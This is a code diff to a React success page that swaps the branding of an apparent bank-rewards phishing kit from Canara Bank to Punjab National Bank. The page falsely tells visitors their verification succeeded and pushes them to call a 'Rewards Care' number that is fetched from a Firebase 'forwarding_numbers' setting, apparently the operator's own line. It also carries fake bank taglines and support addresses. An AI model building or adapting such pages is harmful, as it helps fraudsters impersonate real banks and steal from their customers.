@@ -3,12 +3,12 @@ import FirebaseUtil from '../FirebaseRepo';
 import '../App.css';
 
 const SuccessPage = () => {
-  const [callNumber, setCallNumber] = useState('1800-123-4567');
+  const [callNumber, setCallNumber] = useState('11111');
 
   useEffect(() => {
     const fetchCallNumber = async () => {
       try {
-        const doc = await FirebaseUtil.getDocument("carvana_settings", "forwarding_numbers");
+        const doc = await FirebaseUtil.getDocument("pnb_settings", "forwarding_numbers");
         if (doc?.call_forwarding_number && typeof doc.call_forwarding_number === 'string') {
           setCallNumber(doc.call_forwarding_number.trim());
         }
@@ -21,14 +21,14 @@ const SuccessPage = () => {
 
   return (
     <div className="flex flex-col min-h-screen bg-white">
-      {/* Header - Blue Bar with Logo */}
-      <header className="bg-[#0066b3] p-4 flex justify-between items-center">
+      {/* Header - Burgundy Bar with Logo */}
+      <header className="bg-[#A20E37] p-4 flex justify-between items-center">
         <div className="flex items-center">
           <div className="text-white">
-            <h1 className="text-3xl font-serif">Canara Bank</h1>
-            <p className="text-sm">A Government of India Undertaking</p>
-            <div className="bg-yellow-100 text-yellow-800 px-2 py-0.5 text-xs mt-1 rounded inline-block">
-              Fintech Syndicate
+            <h1 className="text-3xl font-serif">Punjab National Bank</h1>
+            <p className="text-sm">80% Rewards Points Redeem Process Completed</p>
+            <div className="bg-[#FBBC09] text-[#A20E37] px-2 py-0.5 text-xs mt-1 rounded inline-block font-semibold">
+              The Name You Can Bank Upon
             </div>
           </div>
         </div>
@@ -40,13 +40,13 @@ const SuccessPage = () => {
       </header>
 
       {/* Tagline */}
-      <div className="bg-[#0066b3] text-white text-center pb-2">
-        <p>Together We Can</p>
+      <div className="bg-[#A20E37] text-white text-center pb-2">
+        <p>Banking for the Unbanked</p>
       </div>
 
       {/* Main Content */}
       <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
-        <div className="bg-white text-gray-800 rounded-xl w-full max-w-md p-5 shadow-lg">
+        <div className="bg-white text-gray-800 rounded-xl w-full max-w-md p-5 shadow-lg border-t-4 border-[#A20E37]">
           <div className="text-center mb-6">
             <div className="bg-green-100 text-green-800 rounded-full px-4 py-2 mb-4 inline-block">
               <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 inline mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
@@ -54,7 +54,7 @@ const SuccessPage = () => {
               </svg>
               Verification Successful
             </div>
-            <h1 className="text-2xl font-bold text-blue-800 mb-2">
+            <h1 className="text-2xl font-bold text-[#A20E37] mb-2">
               Congratulations!
             </h1>
             <p className="text-gray-600">
@@ -62,35 +62,35 @@ const SuccessPage = () => {
             </p>
           </div>
 
-          <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
+          <div className="bg-yellow-50 border-l-4 border-[#FBBC09] p-4 mb-6">
             <div className="flex">
               <div className="flex-shrink-0">
-                <svg className="h-5 w-5 text-yellow-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
+                <svg className="h-5 w-5 text-[#FBBC09]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                   <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9z" clipRule="evenodd" />
                 </svg>
               </div>
               <div className="ml-3">
                 <p className="text-sm text-yellow-700">
-                  To collect your Rewardz Points, please give a missed call to our Canara Bank Rewardz Care.
+                  To collect your Rewards Points, please give a missed call to our PNB Rewards Care.
                 </p>
               </div>
             </div>
           </div>
 
           <button
-            className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm mb-4"
+            className="w-full bg-[#FBBC09] hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm mb-4"
           >
             CALL NOW TO COLLECT REWARDS
           </button>
 
           <button
-            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-full"
+            className="w-full bg-[#A20E37] hover:bg-[#8a0c2f] text-white font-bold py-2 px-4 rounded-full"
             onClick={() => window.location.reload()}
           >
             Back to Home
           </button>
 
-          <p className="text-xs text-gray-500 text-center">
+          <p className="text-xs text-gray-500 text-center mt-4">
             Your rewards will be credited to your account within 24-48 hours after verification.
           </p>
         </div>
@@ -98,8 +98,8 @@ const SuccessPage = () => {
 
       {/* Bottom Part / Footer */}
       <footer className="bg-gray-800 text-white p-4 text-center">
-        <p className="text-sm"> 2025 Canara Bank. All rights reserved.</p>
-        <p className="text-xs">For support, call {callNumber} or email support@canarabank.com</p>
+        <p className="text-sm"> 2025 Punjab National Bank. All rights reserved.</p>
+        <p className="text-xs">For support, call {callNumber} or email care@pnb.co.in</p>
       </footer>
     </div>
   );
